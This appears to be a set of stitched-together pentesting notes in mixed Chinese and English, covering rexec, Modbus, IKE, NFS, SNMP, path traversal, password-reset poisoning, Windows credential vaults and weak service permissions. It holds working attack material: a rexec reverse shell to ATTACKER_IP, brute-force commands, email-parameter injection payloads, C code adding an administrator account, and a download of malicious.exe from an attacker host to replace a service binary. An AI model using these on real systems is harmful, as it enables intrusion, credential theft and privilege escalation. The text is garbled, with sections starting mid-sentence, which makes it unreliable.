Confirm the classic exec service before credential attacksnmap -p 512 --script rexec-brute --script-args "userdb=users.txt,passdb=rockyou.txt" <target> # 7. Hydra / Medusa / Ncrack 1hydra -L users.txt -P passwords.txt rexec://<target> -s 512 -t 8 # 8. Username 枚举 through server messages 12printf '0\0root\0wrongpass\0id\0' | nc -w 2 <target> 512 | tail -c +2printf '0\0definitelynotreal\0wrongpass\0id\0' | nc -w 2 <target> 512 | tail -c +2 # 9. Check sibling r-services 1nmap -sV -p 512,513,514 <target> # 10. Metasploit 12345use auxiliary/scanner/rservices/rexec_loginset RHOSTS <target>set USER_FILE users.txtset PASS_FILE passwords.txtrun # 11. Sniffing 凭据 12tshark -r traffic.pcap -Y 'tcp.port == 512' -T fields -e data.decoded | \ awk -F"\\0" '{print $2":"$3" -> "$4}' # username:password -> command # 12. Post - 利用 tips 1rexec -l user -p pass <target> 'bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"' # 13. Post - 利用 tips 1find / -xdev \( -name .netrc -o -name netrc -o -iname '*rexec*' -o -path '*/.rhosts' \) 2>/dev/null # 工具与参考入口 https://www.gnu.org/software/inetutils/manual/html node/rexecd-invocation.html https://nmap.org/nsedoc/scripts/rexec-brute.html # 检查清单 是否明确解析器和过滤器 是否从最小 payload 开始 是否验证编码 / 大小写 / 分隔符变体 是否记录可复现请求或样例 # 关联 漏洞利用与载荷总览 知识地图 侦察枚举流水线 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

In that case, you usually need to enumerate multiple unit/slave IDs to reach the device behind the bridge. Whether writes are rare enough that replaying one stands out immediately modbus-discover is useful because it tries to enumerate legal slave IDs and extract device identification data such as vendor and firmware strings. smod: function-code 枚举，UID brute force, fuzzing modules 0x01 / 0x02: read coils / discrete inputs 0x03 / 0x04: read holding / input registers 0x2B/0x0E: Read Device Identification (vendor, product code, revision, optional objects) 0x05: write single coil 0x06: write single holding register 0x0F: write multiple coils 0x10: write multiple holding registers 0x16: mask write register 0x17: read/write multiple registers # 命令 / 载荷 / 操作片段 # 1. Basic Information 12PORT STATE SERVICE502/tcp open modbus # 2. Automatic 1234nmap -sV --script modbus-discover -p 502 <IP>nmap --script modbus-discover --script-args='modbus-discover.aggressive=true' -p 502 <IP>msf> use auxiliary/scanner/scada/modbusdetectmsf> use auxiliary/scanner/scada/modbus_findunitid # 3. Passive 侦察 123tshark -r modbus.pcap -Y modbus \ -T fields -e ip.src -e ip.dst -e modbus.unit_id \ -e modbus.func_code -e modbus.reference_num -e modbus.word_cnt # 4. Passive 侦察 1234modbusmodbus.func_code == 3modbus.func_code == 16modbus.exception_code # 5. Manual 枚举 with PyModbus 1python3 -m pip install pymodbus # 6. This is achieved through the use of a Pre-Shared Key (PSK) or certificates, employing either main mode, which involves three pairs of messages, or aggressive mode. Phase 1.5: Though not mandatory, this phase, known as the Extended 认证 Phase, verifies the identity of the user attempting to connect by requiring a username and 密码. Then, in this case we already have a valid transformation but if you are in the 3rd case, then you need to brute-force a little bit to find a valid transformation: And then brute-force each one using ike-scan (this can take several minutes): You can try the same attack using iker.py.\ 2 = HMAC-SHA = SHA1 (in this case). The --trans format is Enc,Enc,Enc, 哈希，Auth,Auth,Auth,DH Packet: IKE SA INIT response contains one or more Vendor ID 载荷 WatchGuard format: 32-byte 哈希 followed by base64 that decodes to e.g. VN=12.11.3 BN=719894 This is not part of any IKEv2 RFC. Treat it as a vendor quirk for rapid scoping of exposed/vulnerable Fireware OS versions. iker.py also uses ike-scan to bruteforce possible group names. It follows it's own method to find a valid ID based on the output of ike-scan. The first method is to brute-force the group names by searching for the information Dead Peer 检测 DPD of Cisco systems (this info is only replayed by the server if the group name is correct). Replace [VPN USERNAME] and [VPN 密码] with the VPN 认证 凭据. Follow with IKE SA AUTH carrying an IDi that triggers the bug (e.g., an oversized Identification copied into a fixed-size stack buffer before certificate validation). As mentioned previously, NFS will usually trust the client's uid and gid to access the files (if kerberos is not used). However, there are some configurations that can be set in the server to change this behavior: ../linux-hardening/privilege-escalation/nfs-no root squash-misconfiguration-pe.md For example, if an NFS server is exporting /srv/ and /var/ is in the same filesystem, it's possible to read logs from /var/log/ or store a webshell in /var/www/. The tool nfs analyze from https://github.com/hvs-consulting/nfs-security-tooling is built to support this attack against the file systems ext4, xfs, btrfs in the version 3 (it should also be posisble in v4). To easily list, mount and change UID and GID to have access to files you can use nfsshell. Read and Write Permissions (rw): This setting allows both reading from and writing to the file system. It's essential to consider the implications of granting such broad access. Root Files Ownership (no root squash): With this setting, files created by the root user maintain their original UID/GID of 0, disregarding the principle of least privilege and potentially granting excessive permissions. # 命令 / 载荷 / 操作片段 # 1. Basic Information 12049/tcp open nfs 2-3 (RPC #100003 # 2. Hosts 12/PATH/TO/EXPORT CLIENT1(OPTIONS1) CLIENT2(OPTIONS2) .../media/disk/share 192.168.2.123(rw,sec=krb5p:krb5i) # 3. Showmount 1showmount -e <IP> # 4. Useful nmap scripts 123nfs-ls #List NFS exports and check permissionsnfs-showmount #Like showmount -enfs-statfs #Disk statistics and info from NFS share # 5. Useful metasploit modules 1scanner/nfs/nfsmount #Scan NFS mounts and list permissions # 6. Mounting 1mount -t nfs [-o vers=2] <ip>:<remote_folder> <local_folder> -o nolock # 7. Mounting 12mkdir /mnt/new_backmount -t nfs [-o vers=2] 10.12.0.150:/backup /mnt/new_back -o nolock # 8. Config files 12/etc/exports/etc/lib/nfs/etab # 9. HackTricks Automatic Commands 123456789101112131415161718192021222324Protocol_Name: NFS #Protocol Abbreviation if there is one.Port_Number: 2049 #Comma separated if there is more than one.Protocol_Description: Network File System #Protocol Abbreviation Spelled outEntry_1: Name: Notes Description: Notes for NFS Note: | NFS is a system designed for client/server that enables users to seamlessly access files over a network as though these files were located within a local directory. #apt install nfs-common showmount 10.10.10.180 ~or~showmount -e 10.10.10.180 should show you available shares (example /home) mount -t nfs -o ver=2 10.10.10.180:/home /mnt/ cd /mnt nano into /etc/passwd and change the uid (probably 1000 or 1001) to match the owner of the files if you are not able to get in https://book.hacktricks.wiki/en/network-services-pentesting/nfs-service-pentesting.htmlEntry_2: Name: Nmap Description: Nmap with NFS Scripts Command: nmap --script=nfs-ls.nse,nfs-showmount.nse,nfs-statfs.nse -p 2049 {IP} # 工具与参考入口 https://github.com/hvs-consulting/nfs-security-tooling great article nfsshell Nice NFSShell tutorial. # 检查清单 是否明确解析器和过滤器 是否从最小 payload 开始 是否验证编码 / 大小写 / 分隔符变体 是否记录可复现请求或样例 # 关联 漏洞利用与载荷总览 知识地图 Linux 原生工具利用 CTF 取证隐写 侦察枚举流水线 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

As mentioned before, in order to access the information saved on the MIB you need to know the community string on versions 1 and 2/2c and the 凭据 on version 3.\ public mainly read only functions private Read/Write in general Note that the writability of an OID depends on the community string used, so even if you find that "public" is being used, you could be able to write some values. Also, there may exist objects which are always "Read Only".\ If you try to write an object a noSuchName or readOnly error is received**.** running (may contain passwords).... # 命令 / 载荷 / 操作片段 # 1. content: 来源路径： 02-知识点/域与Windows/🛠️ 目录穿越.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # 🛠️ 目录穿越 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 🛠️ 目录穿越 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 🛠️ 目录穿越 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：Theory、Notes、Path separator、Windows、Practice；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 7 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Theory Notes Path separator Windows Practice Tool Manual testing 侦察 Filter 绕过 User privilege # 核心要点 Windows OS' Shell' : Files and directories are case-insensitive, so there's no need to try different 载荷 based on case sensitivity. Also, one has to make sure that the 载荷 don't use a fixed drive letter ("C:"), but more ("D:", "E:"...). The tool dotdotpwn (Perl) can help in finding and exploiting 目录穿越 vulnerabilities by fuzzing the web app. However, manual testing is usually more efficient. Next, finding the right parameter to inject is essential. Usually, a vulnerable parameter is one that requires a file that will be fetched by the back-end server using a path (form parameters, cookies...). Then, to construct a 载荷，it's interesting to have a set of important files to search: Linux (PayloadsAllTheThings) Windows (PayloadsAllTheThings) # 命令 / 载荷 / 操作片段 # 1. Path separator 12root directory: "/"directory separator: "/" # 2. Path separator 12root directory: "<drive letter>:\"directory separator: "\" or "/" # 3. Path separator 12root directory: "<drive letter>:"directory separator: ":" # 4. Tool 12345# With a request file where /?argument=TRAVERSAL (request file must be in /usr/share/dotdotpwn)dotdotpwn.pl -m payload -h $RHOST -x $RPORT -p $REQUESTFILE -k "root:" -f /etc/passwd​# Generate a wordlist in STDOUT that can be used by other fuzzers (ffuf, gobuster...)dotdotpwn -m stdout -d 5 # 5. 侦察 12# Examplehttp://example.com/getItem.jsp?item=file.html # 6. User privilege 1234c:/documents and settings/administrator/ntuser.ini c:/documents and settings/administrator/desktop/desktop.ini c:/users/administrator/desktop/desktop.ini c:/users/administrator/ntuser.ini # 7. User privilege 1234c:/system volume information/wpsettings.dat C:/Windows/CSC/v2.0.6/pq C:/Windows/CSC/v2.0.6/sm C:/$Recycle.Bin/S-1-5-18/desktop.ini # 工具与参考入口 Owasp dotdotpwn web technology Linux (PayloadsAllTheThings) Windows (PayloadsAllTheThings) PayloadsAllTheThings soffensive.com https://portswigger.net/web-security/file-path-traversal # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 侦察枚举流水线 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

content: 来源路径： 02-知识点/域与Windows/🛠️ 密码 reset.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # 🛠️ 密码 reset [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 🛠️ 密码 reset 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 🛠️ 密码 reset 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：Theory、Practice、密码 Reset Poisoning、令牌 leak via Referer header、Paramater manipulation；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 2 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Theory Practice 密码 Reset Poisoning 令牌 leak via Referer header Paramater manipulation # 核心要点 Websites that manage user accounts usually have a "forgot 密码" or "reset 密码" feature. This offers attackers an interesting vector as it could potentially lead to Account Takeover (ATO). Is there a captcha, rate-limit or any other anti-DoS mitigation? Is there any kind of validation, from the user, that the 密码 must be reset? This could lead to a kind of DoS on user accounts if there isn't. Is the previous 密码 sent in clear-text to the user, indicating that the passwords are not stored in a hashed format? If a one-time 密码 (OTP) is sent to proceed with the 密码 reset, is it sent on a secure channel (e.g. mitigating MitM)? Can the feature be used by attackers to enumerate users (e.g. error message when trying to proceed with a user that doesn't exist)? Is there a 密码 reset link sent? If so: Is "密码 reset" link sent to an email indicated in a parameter that is not correctly filtered? --> Paramater manipulation # 命令 / 载荷 / 操作片段 # 1. Paramater manipulation 1234567email=victim@email.com&email=attacker@email.comemail=victim@email.com%20email=attacker@email.comemail=victim@email.com|email=attacker@email.comemail="victim@mail.tld%0a%0dcc:attacker@mail.tld"email="victim@mail.tld%0a%0dbcc:attacker@mail.tld"email="victim@mail.tld",email="attacker@mail.tld"{"email":["victim@mail.tld","atracker@mail.tld"]} # 2. Paramater manipulation 1("form": {"email":"victim@email.tld","password":"12345678"}) # 工具与参考入口 blog post # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

It houses login 凭据 such as usernames, passwords, and web addresses. There are four distinct categories of stored 凭据: Web-based 凭据：认证 details saved in web browsers (or other applications) Windows-specific 凭据：认证 data such as NTLM or Kerberos Generic 凭据: fundamental 认证 data, such as clear-text usernames and passwords Certificate-based 凭据: comprehensive information based on certificates From Windows systems, vaultcmd.exe can be used to enumerate, check and list Microsoft 凭据. However, this tool does not allow to see clear text passwords as it is an official, native, Windows program. # 命令 / 载荷 / 操作片段 # 1. Practice 12345678#enumerate current Windows safes availablevaultcmd /list#Check for credentials stored in the vaultVaultCmd /listproperties:"$coffre_name"#more information about the VaultVaultCmd /listcreds:"$coffre_name" # 2. Practice 12345powershell -ex bypassImport-Module C:\Get-WebCredentials.ps1Get-WebCredentials # 工具与参考入口 Get-WebCredentials.ps1 Mimkatz sekurlsa::credman # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

content: 来源路径： 02-知识点/域与Windows/🛠️ Weak service permissions 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # 🛠️ Weak service permissions 技术笔记 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 🛠️ Weak service permissions 技术笔记 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 🛠️ Weak service permissions 技术笔记 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：🛠️ Weak service permissions、Theory、Pratice、Insecure permissions on service executable、Enumerate of vulnerable services；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 11 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 🛠️ Weak service permissions Theory Pratice Insecure permissions on service executable Enumerate of vulnerable services Crafting a malicious binary Replacing binaries Methods for service restart Configuring the LocalAccountTokenFilterPolicy Ressources # 核心要点 RX (Read and execute access): Permits viewing the file and executing it if it's an executable. R (Read-only access): Only allows viewing the file without making changes. W (Write-only access): Permits writing to the file but not reading or executing it. Once the command is executed, it will only be necessary to restart the service to ensure that the abuse has been successfully carried out. The second method involves creating a custom malicious binary, which can offer advantages, such as bypassing antivirus 检测. Below is a simple C code that will execute a Windows system command (the system command can, of course, be replaced with another). Due to the incorrect permissions, the attacker can replace the original executable by renaming it, for example. The attacker can then add the new malicious file with the same name as the original one. # 命令 / 载荷 / 操作片段 # 1. Enumerate of vulnerable services 12345678910111213# USING POWERSHELL> Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}# USING POWERUP> Invoke-AllChecks[*] Checking service executable and argument permissions...ServiceName : aniServicePath : C:\Program Files\AniService\ani.exeModifiableFile : C:\Program Files\AniService\ani.exeStartName : LocalSystemAbuseFunction : Install-ServiceBinary -ServiceName 'aniService' # 2. Enumerate of vulnerable services 123456> icacls "C:\Program Files\AniService\ani.exe"C:\Program Files\AniService\ani.exe AUTORITE NT\System:(F) BUILTIN\Administrators:(F) Everyone:(F) BUILTIN\Users:(RX) # 3. Crafting a malicious binary 1> Install-ServiceBinary -ServiceName 'aniService' -User vador -P "D4rkIsD@rk" # 4. Crafting a malicious binary 1234567#include <stdlib.h>int main (){int i; i = system("net user vador D4rkIsD@rk /add && timeout /t 2 && net localgroup Administrators vador /add");return 0;} # 5. Crafting a malicious binary 1> i686-w64-mingw32-gcc CODE.C$ -lws2_32 -o FILE.EXE$ # 6. Replacing binaries 1234> move ani.exe ani.exe.bak# DOWNLOAD THE MALICIOUS EXECUTABLE> iwr http://<ATTACKER_IP>/malicious.exe -Outfile "C:\Program Files\AniService\ani.exe" # 7. Methods for service restart 1234567891011> ./accesschk64.exe /accepteula -ucqv <SERVICE_NAME>Copyright (C) 2006-2022 Mark RussinovichSysinternals - www.sysinternals.comaniService Medium Mandatory Level (Default) [No-Write-Up] R DESKTOP-5VHCKF3\admin SERVICE_PAUSE_CONTINUE SERVICE_START SERVICE_STOP # 8. Methods for service restart 12345# STOP SERVICE> net stop <SERVICE_NAME># START SERVICE> net start <SERVICE_NAME> # 9. Methods for service restart 12345678910111213> sc.exe qc <SERVICE_NAME>[SC] QueryServiceConfig réussite(s)SERVICE_NAME: aniService TYPE : 10 WIN32_OWN_PROCESS START_TYPE : 2 AUTO_START ERROR_CONTROL : 1 NORMAL BINARY_PATH_NAME : C:\Program Files\AniService\ani.exe LOAD_ORDER_GROUP : TAG : 0 DISPLAY_NAME : Anakin Skywalker Service DEPENDENCIES : SERVICE_START_NAME : LocalSystem # 10. Methods for service restart 1> shutdown /r /t 0 # 11. Configuring the LocalAccountTokenFilterPolicy 1> reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /f /v LocalAccountTokenFilterPolicy /t Reg_DWORD /d 1 # 工具与参考入口 PowerUp accesschk.exe https://kb.cybertecsecurity.com/knowledge/localaccounttokenfilterpolicy # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 侦察枚举流水线 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。
